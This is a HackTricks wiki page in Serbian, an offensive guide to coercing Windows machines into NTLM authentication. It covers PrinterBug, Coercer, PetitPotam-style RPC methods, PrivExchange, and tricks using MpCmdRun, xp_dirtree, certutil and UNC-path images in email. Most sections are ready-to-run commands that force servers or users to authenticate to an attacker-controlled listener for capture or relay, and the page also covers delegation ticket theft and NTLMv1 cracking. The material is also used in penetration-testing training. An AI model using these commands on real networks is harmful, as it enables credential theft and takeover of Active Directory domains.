# Prisilna privilegovana NTLM autentikacija

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **zbirka** **triggera za udaljenu autentikaciju**, napisana u jeziku C# pomoću MIDL kompajlera radi izbegavanja zavisnosti od 3rd party komponenti.

## Abuse Print Spooler servisa

Ako je servis _**Print Spooler**_ **omogućen,** možete koristiti neke već poznate AD kredencijale da od print servera Domain Controllera **zatražite** ažuriranje o novim poslovima štampanja i jednostavno mu kažete da **pošalje obaveštenje nekom sistemu**.\
Imajte na umu da, kada printer pošalje obaveštenje proizvoljnim sistemima, mora da se **autentikuje na** tom **sistemu**. Zbog toga napadač može naterati servis _**Print Spooler**_ da se autentikuje na proizvoljnom sistemu, a servis će u toj autentikaciji **koristiti račun računara**.

U pozadini, klasični **PrinterBug** primitiv zloupotrebljava **`RpcRemoteFindFirstPrinterChangeNotificationEx`** preko **`\\PIPE\\spoolss`**. Napadač prvo otvara handle printera/servera, a zatim prosleđuje lažno ime klijenta u `pszLocalMachine`, zbog čega ciljni spooler kreira kanal za obaveštenja **nazad ka hostu pod kontrolom napadača**. Zbog toga je efekat **forsiranje izlazne autentikacije**, a ne direktno izvršavanje koda.<sup>[[2]](#references)</sup>\
Ako tražite **RCE/LPE** u samom spooleru, pogledajte [PrintNightmare](printnightmare.md). Ova stranica je fokusirana na **coercion i relay**.

### Pronalaženje Windows servera u domenu

Pomoću PowerShell-a pribavite listu Windows računara. Serveri su obično prioritet, pa ćemo se fokusirati na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Pronalaženje Spooler servisa koji osluškuju

Koristeći blago izmenjeni [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autora @mysmartlogin (Vincent Le Toux), proverite da li Spooler Service osluškuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Takođe možete koristiti `rpcdump.py` na Linuxu i potražiti **MS-RPRN** protokol:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ili brzo testirajte hostove iz Linux-a pomoću **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ako želite da **enumerišete coercion surfaces** umesto da samo proverite da li spooler endpoint postoji, koristite **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Ovo je korisno zato što vam prikaz endpointa u EPM-u govori samo da je print RPC interfejs registrovan. To **ne** garantuje da je svaki coercion metod dostupan sa vašim trenutnim privilegijama niti da će host pokrenuti upotrebljiv authentication flow.

### Zatražite od servisa da se autentifikuje prema proizvoljnom hostu

Možete kompajlirati [SpoolSample odavde](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ili koristite [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako ste na Linux-u
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Pomoću **Coercer**, možete direktno ciljati spooler interfejse i izbeći nagađanje o tome koji je RPC method izložen:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Prinudno korišćenje HTTP umesto SMB-a sa WebClient-om

Klasični PrinterBug obično daje **SMB** autentikaciju ka `\\attacker\share`, što je i dalje korisno za **capture**, **relay ka HTTP targetima** ili **relay tamo gde SMB signing nije prisutan**.\
Međutim, u modernim okruženjima, **SMB ka SMB** relay je često blokiran pomoću **SMB signing-a**, pa operatori često preferiraju da umesto toga prinude **HTTP/WebDAV** autentikaciju.

Ako je na targetu pokrenut servis **WebClient**, listener se može navesti u formi koja primorava Windows da koristi **WebDAV preko HTTP-a**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Ovo je naročito korisno kada se kombinuje sa **`ntlmrelayx --adcs`** ili drugim HTTP relay ciljevima, jer se tako izbegava oslanjanje na mogućnost SMB relay-a na prinudnoj konekciji. Važna napomena je da **WebClient mora biti pokrenut** na žrtvi da bi HTTP/WebDAV varijanta funkcionisala.

### Kombinovanje sa Unconstrained Delegation

Ako je napadač već kompromitovao računar sa [Unconstrained Delegation](unconstrained-delegation.md), može **naterati printer da se autentikuje prema tom računaru**. Zbog unconstrained delegation-a, **TGT** **computer account-a printera** biće **sačuvan u** **memoriji** računara sa unconstrained delegation-om. Pošto je napadač već kompromitovao ovaj host, moći će da **preuzme ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).

## RPC prinudna autentikacija

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfejsi/opnum-i koji pokreću odlaznu autentikaciju)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asinhroni interfejs za štampanje na istom spooler pipe-u; koristite Coercer za enumeraciju dostupnih metoda na datom hostu<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (takođe preko \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Napomena: Ove metode prihvataju parametre koji mogu sadržati UNC path (npr. `\\attacker\share`). Prilikom obrade, Windows će se autentikovati (u kontekstu računara/korisnika) prema tom UNC-u, čime se omogućavaju hvatanje ili relay NetNTLM-a.\
Kod zloupotrebe spooler-a, **MS-RPRN opnum 65** i dalje predstavlja najčešće korišćenu i najbolje dokumentovanu primitivu, jer specifikacija protokola izričito navodi da server kreira kanal za obaveštenja prema klijentu navedenom u `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN preko \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: cilj pokušava da otvori prosleđenu putanju rezervnog loga i autentikuje se prema UNC-u pod kontrolom napadača.<sup>[[1]](#references)</sup>
- Practical use: prinudite Tier 0 resurse (DC/RODC/Citrix/itd.) da emituju NetNTLM, a zatim izvršite relay prema AD CS endpoint-ima (ESC8/ESC11 scenariji) ili drugim privilegovanim servisima.<sup>[[1]](#references)</sup>

## PrivExchange

Napad `PrivExchange` rezultat je propusta pronađenog u **Exchange Server `PushSubscription` funkcionalnosti**. Ova funkcionalnost omogućava da se Exchange server natera da se, od strane bilo kog korisnika domena sa mailbox-om, autentikuje prema bilo kom hostu koji obezbedi klijent, preko HTTP-a.

Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (konkretno, poseduje **WriteDacl privilegije na domenu pre kumulativnog ažuriranja iz 2019. godine**). Ovaj propust može se iskoristiti za omogućavanje **relay-a informacija prema LDAP-u, a zatim i izdvajanje NTDS baze podataka domena**. U slučajevima kada relay prema LDAP-u nije moguć, ovaj propust se i dalje može koristiti za relay i autentikaciju prema drugim hostovima unutar domena. Uspešno iskorišćavanje ovog napada omogućava neposredan pristup nalogu Domain Admin uz bilo koji autentikovani nalog korisnika domena.

## Unutar Windows-a

Ako se već nalazite unutar Windows računara, možete naterati Windows da se poveže sa serverom koristeći privilegovane naloge pomoću:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (Microsoft-om potpisani binary) za prisiljavanje NTLM autentifikacije:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Putem emaila

Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite da kompromitujete, možete mu jednostavno poslati **email sa slikom veličine 1x1** kao što je
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
a kada je otvori, pokušaće da se autentifikuje.

### MitM

Ako možete da izvršite MitM napad na računaru i ubacite HTML u stranicu koju će korisnik videti, možete pokušati da u stranicu ubacite sliku poput sledeće:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Drugi načini za prisiljavanje i phishing NTLM autentikacije


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ako možete da uhvatite [NTLMv1 izazove, ovde pročitajte kako da ih crackujete](../ntlm/index.html#ntlmv1-attack).\
_Ne zaboravite da za cracking NTLMv1 morate da podesite Responder challenge na "1122334455667788"_

## Reference

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
